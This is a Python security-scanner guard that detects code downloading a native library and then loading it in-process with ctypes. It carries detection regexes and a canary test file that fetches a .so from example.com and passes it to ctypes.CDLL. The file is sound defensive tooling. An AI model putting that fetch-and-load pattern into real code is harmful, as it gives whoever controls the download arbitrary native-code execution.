"""Guard: no ctypes load of a native library downloaded earlier in the same scope (checklist
§8, new item).

Loading a native library with `ctypes` runs unreviewed machine code IN-PROCESS — unlike a
subprocess, there is no boundary at all between the loaded code and the Python interpreter's
own memory. Fetching that library over the network moments earlier means the code that will be
mapped into the process was never reviewed, pinned, or checksum-verified: a compromised
download host, a poisoned DNS response, or an on-path attacker on a plain-HTTP fetch gets
arbitrary native-code execution. Ported from `rakshit-737/warden-supply-chain-security`'s
`warden-python.yml` semgrep rule (`warden.malicious_behavior.ctypes-load-downloaded-library`,
fetched and read in full).

  **`ctypes-load-after-download` (HIGH):** a network-download call
  (`urllib.request.urlretrieve`, `requests.get`, `httpx.get`, or a `urlopen` response written
  to a file) appears a few lines BEFORE a ctypes native-library-load call (`ctypes.CDLL`/
  `PyDLL`/`WinDLL`/`OleDLL`, or `ctypes.cdll`/`windll`/`pydll`/`oledll` `.LoadLibrary(`) in the
  same file — fetch-then-load-into-process, with no review step in between.

**Narrower than pure proximity (fixed, review):** the source's semgrep rule threads
a specific metavariable (`$LIB`) from the download call through an intermediate
`open(...).write(...)` or `write_bytes(...)` step to the exact ctypes argument. This guard
originally approximated that with a pure 15-line proximity window — a download call anywhere
in the file followed, within that window, by ANY ctypes-load call, with no check that the two
were related at all. That over-fired on an unrelated healthcheck `requests.get(...)` sitting a
few lines above a perfectly ordinary `ctypes.CDLL("libc.so.6")` system-library load (Dean's
review). It now requires a real link between the two: the ctypes call's argument list references
the download's assigned result (`lib_path, _ = urlretrieve(url)` ... `ctypes.CDLL(lib_path)`),
`urlretrieve`'s own destination argument (`urlretrieve(url, path)` ... `ctypes.CDLL(path)`,
positional or `filename=`), or the destination of an `open(dest, "wb")`/`dest.write_bytes(` write
just after the download; or the download call is itself nested inside the ctypes call's argument
list (`ctypes.CDLL(urlretrieve(url)[0])`, which needs no window). The destination argument and the
nested form were both missed until PR #1093 round 2. This is still not full dataflow (an
intermediate re-assignment one hop away isn't traced, matching this project's other
same-file-correlation guards), but it closes the "two unrelated calls in one window" false
positive while the canary's own shape still fires.

Fires on Python source when `python` is detected. Suppress an audited case (a legitimate
plugin system with its own pinned-checksum verification the pattern below cannot see) with:

    # security: allow-ctypes-load-downloaded-library
"""
from __future__ import annotations

import re
from bisect import bisect_left, bisect_right
from pathlib import Path
from typing import NamedTuple

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    close_paren_map,
    is_nonproduct_path,
    iter_files,
    pragma_present,
    python_scan_dirs,
    read,
    rel,
    split_call_args,
    strip_python_line_comment,
    strip_python_strings,
)

_PY_SUFFIXES = (".py", ".pyi")
_WINDOW = 15

_DOWNLOAD = re.compile(
    r"\burllib\.\w+\.urlretrieve\s*\("
    r"|\brequests\.get\s*\("
    r"|\bhttpx\.get\s*\("
    r"|\burllib\.\w+\.urlopen\s*\(",
    re.IGNORECASE,
)
_CTYPES_LOAD = re.compile(
    r"\bctypes\s*\.\s*(?:CDLL|PyDLL|WinDLL|OleDLL)\s*\("
    r"|\bctypes\s*\.\s*(?:cdll|windll|pydll|oledll)\s*\.\s*LoadLibrary\s*\(",
    re.IGNORECASE,
)

# The variable a download's result was assigned to, read backward from the download match on
# the same line -- `lib_path, headers = urllib.request.urlretrieve(url)` -> "lib_path". Used to
# require the ctypes-load call's OWN argument list actually reference it, not just land in the
# same proximity window. The lookbehind stops a failing search from restarting inside
# a word or a name list, and only the last `_ASSIGN_LOOKBACK_CHARS` of the line are searched:
# unanchored over a long line, once per download, it was quadratic (PR #1093 round 3, M1).
_ASSIGN_BEFORE = re.compile(r"(?<![\w,])(\w+)(?:\s*,\s*\w+)*\s*=\s*$")
_ASSIGN_LOOKBACK_CHARS = 200

# A write-to-file destination shortly after a download -- `open('lib.dll', 'wb').write(resp.content)`
# or `<path>.write_bytes(...)` -- whose own destination name/literal the ctypes call may reference
# instead of (or in addition to) the download's assigned variable (the `requests.get()` ->
# `open(...).write(...)` -> `ctypes.windll.LoadLibrary(...)` shape, one hop beyond a bare variable).
_WRITE_CALL = re.compile(
    r"\bopen\s*\(\s*(?P<dest>'[^']*'|\"[^\"]*\"|\w+)\s*,\s*['\"][wa]b?['\"]\s*\)"
    r"|(?P<dest2>'[^']*'|\"[^\"]*\"|\w+)\s*\.\s*write_bytes\s*\(",
    re.IGNORECASE,
)
_WRITE_LOOKAHEAD_CHARS = 400
# A keyword argument's `name=` head (matched at the argument's start; the value is the rest).
_KWARG = re.compile(r"(?<!\w)(\w+)\s*=(?!=)")
_WORD = re.compile(r"\w+")
# A ctypes argument list longer than this is not a real library load; capping the inspected span
# bounds the scan on a hostile file of deeply nested calls.
_MAX_ARG_CHARS = 4096


class _Download(NamedTuple):
    start: int
    line: int
    tokens: tuple[str, ...]


_PRAGMA = "security: allow-ctypes-load-downloaded-library"
_STANDARDS = ["OWASP:A08", "CWE-494"]


class CtypesLoadDownloadedLibraryGuard(Guard):
    id = "ctypes-load-downloaded-library"
    title = "No ctypes load of a native library downloaded earlier in the same scope"
    area = "Code safety"

    # loader.py: urlretrieve downloads a .so, then ctypes.CDLL loads it moments later -> fires
    # ctypes-load-downloaded-library/ctypes-load-after-download (HIGH).
    canary_plant = CanaryPlant(
        files={
            "loader.py": (
                "import ctypes\n"
                "import urllib.request\n"
                "lib_path, headers = urllib.request.urlretrieve('https://example.com/lib.so')\n"
                "lib = ctypes.CDLL(lib_path)\n"
            ),
        },
        expects=frozenset({"ctypes-load-downloaded-library/ctypes-load-after-download"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return "python" in profile.features

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        seen: set[Path] = set()
        for d in python_scan_dirs(root, profile):
            for f in iter_files(d, _PY_SUFFIXES):
                if f in seen:
                    continue
                seen.add(f)
                if is_nonproduct_path(rel(root, f), profile.archive_segments):
                    continue
                out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        text = read(f)
        if not text or pragma_present(_PRAGMA, text, dialect="python"):
            return []
        stripped = strip_python_strings(text, filename=f)
        code = "\n".join(strip_python_line_comment(ln) for ln in stripped.splitlines())

        # Everything per-file is computed ONCE (paren pairs, line starts, each download's link
        # tokens): per-ctypes-match rescans of the whole file were quadratic (PR #1093 round 2).
        pairs = close_paren_map(code)
        line_starts = [0, *(m.end() for m in re.finditer("\n", code))]
        downloads = [
            _Download(m.start(), bisect_right(line_starts, m.start()), self._candidate_tokens(code, m, pairs))
            for m in _DOWNLOAD.finditer(code)
        ]
        dl_starts = [d.start for d in downloads]
        dl_lines = [d.line for d in downloads]

        out: list[Finding] = []
        for ctypes_match in _CTYPES_LOAD.finditer(code):
            open_idx = ctypes_match.end() - 1
            close_idx = pairs.get(open_idx)
            if close_idx is None:
                continue
            lineno = bisect_right(line_starts, ctypes_match.start())
            # The download is itself nested inside the ctypes call's argument list. No window:
            # a nested download is never on an EARLIER line, which is why this branch used to
            # sit unreachable behind the window filter below.
            nested = bisect_left(dl_starts, open_idx)
            if nested < len(dl_starts) and dl_starts[nested] <= close_idx:
                out.append(self._finding(root, f, lineno))
                continue
            arg_span = code[open_idx:min(close_idx, open_idx + _MAX_ARG_CHARS)]
            words = set(_WORD.findall(arg_span))
            lo = bisect_left(dl_lines, max(1, lineno - _WINDOW))
            hi = bisect_left(dl_lines, lineno)
            if any(self._token_in(t, arg_span, words) for d in downloads[lo:hi] for t in d.tokens):
                out.append(self._finding(root, f, lineno))
        return out

    @staticmethod
    def _token_in(token: str, arg_span: str, words: set[str]) -> bool:
        # a bare identifier must be a whole word of the argument list; a path/filename literal
        # may start or end with a non-word char (`/tmp/lib.so`), so it is plain containment.
        return token in words if token.isidentifier() else token in arg_span

    @staticmethod
    def _candidate_tokens(code: str, dl_match: re.Match[str], pairs: dict[int, int]) -> tuple[str, ...]:
        """Names the ctypes call's argument might reference for THIS download: the variable the
        download result was assigned to, `urlretrieve`'s own destination argument, and/or a file
        destination it was written to shortly after (the `requests.get()` -> `open(dest,
        "wb").write(resp.content)` -> `LoadLibrary(dest)` shape -- the ctypes call often names
        the same destination literal, not the response variable itself)."""
        tokens: list[str] = []
        line_start = code.rfind("\n", 0, dl_match.start()) + 1
        lookback = max(line_start, dl_match.start() - _ASSIGN_LOOKBACK_CHARS)
        assign = _ASSIGN_BEFORE.search(code[lookback:dl_match.start()])
        if assign:
            tokens.append(assign.group(1))
        if "urlretrieve" in dl_match.group(0).lower():
            dest = CtypesLoadDownloadedLibraryGuard._urlretrieve_dest(code, dl_match.end() - 1, pairs)
            if dest:
                tokens.append(dest)
        tail_start = dl_match.end()
        tail_end = min(len(code), tail_start + _WRITE_LOOKAHEAD_CHARS)
        for wc in _WRITE_CALL.finditer(code, tail_start, tail_end):
            dest = wc.group("dest") or wc.group("dest2")
            if dest:
                tokens.append(dest.strip("'\""))
        return tuple(t for t in tokens if t)

    @staticmethod
    def _urlretrieve_dest(code: str, open_idx: int, pairs: dict[int, int]) -> str | None:
        """`urlretrieve(url, filename)`'s destination: the second positional argument or the
        `filename=` keyword, quotes stripped from a literal."""
        close_idx = pairs.get(open_idx)
        if close_idx is None or close_idx - open_idx > _MAX_ARG_CHARS:
            return None
        args = split_call_args(code[open_idx:close_idx + 1], 0) or []
        for pos, arg in enumerate(args):
            text = arg.strip()
            kw = _KWARG.match(text)
            if kw and kw.group(1) == "filename":
                return text[kw.end():].strip().strip("'\"")
            if not kw and pos == 1:
                return text.strip("'\"")
        return None

    def _finding(self, root: Path, f: Path, lineno: int) -> Finding:
        return Finding(
            check_id=self.id,
            severity="high",
            title=self.title,
            location=f"{rel(root, f)}:{lineno}",
            message=(
                "A ctypes native-library-load call appears a few lines after a network-"
                "download call in this file. Loading a freshly downloaded native library runs "
                "unreviewed machine code in-process -- there is no boundary at all between it "
                "and the Python interpreter's own memory."
            ),
            remediation=(
                "Never load a native library that was just downloaded without verifying its "
                "checksum/signature against a value published out-of-band first. If this "
                "verification happens elsewhere in a way this pattern cannot see, suppress "
                f"with `# {_PRAGMA}`."
            ),
            rule="ctypes-load-downloaded-library/ctypes-load-after-download",
            standards=list(_STANDARDS),
        )
